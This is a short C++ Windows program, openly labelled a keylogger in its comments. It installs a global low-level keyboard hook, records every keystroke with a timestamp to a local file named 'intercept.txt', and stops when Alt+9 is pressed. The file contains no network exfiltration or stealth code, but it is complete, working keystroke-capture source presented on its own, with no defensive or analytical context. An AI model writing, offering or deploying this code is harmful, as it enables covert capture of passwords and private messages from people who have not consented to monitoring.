#define WIN32_WINNT 0x0500
#include <windows.h>
#include <fstream>
#include <iostream>
#include <ctime>
#pragma comment(lib, "user32.lib")
using namespace std;

// Open the log file
ofstream out("intercept.txt", ios::out);

LRESULT CALLBACK ProcessKB(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

        // Get the current time
        time_t now = time(0);
        tm* localtm = localtime(&now);
        out << asctime(localtm) << " - ";

        // Handle key and shift states
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        // Get the key name
        char buffer[16];
        if (ToAscii(p->vkCode, p->scanCode, keyboardState, (LPWORD)buffer, 0) == 1) {
            out << buffer[0];
        } else {
            out << "[VK_" << p->vkCode << "]";
        }

        out << "\n";
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    MSG msg;
    out << "Intercepted keyboard:\n\n";

    // Set the low-level keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKB, hInstance, 0);
    if (!keyboardHook) {
        cerr << "Failed to install hook!" << endl;
        return 1;
    }

    // Register a hotkey (Alt + 9) to stop the keylogger
    RegisterHotKey(NULL, 1, MOD_ALT, 0x39);

    // Message loop
    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        if (msg.message == WM_HOTKEY)
        {
            UnhookWindowsHookEx(keyboardHook);
            out << "\n\nEnd Intercept\n";
            out.close();
            return 0;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup in case of unexpected exit
    UnhookWindowsHookEx(keyboardHook);
    out.close();
    return 0;
}
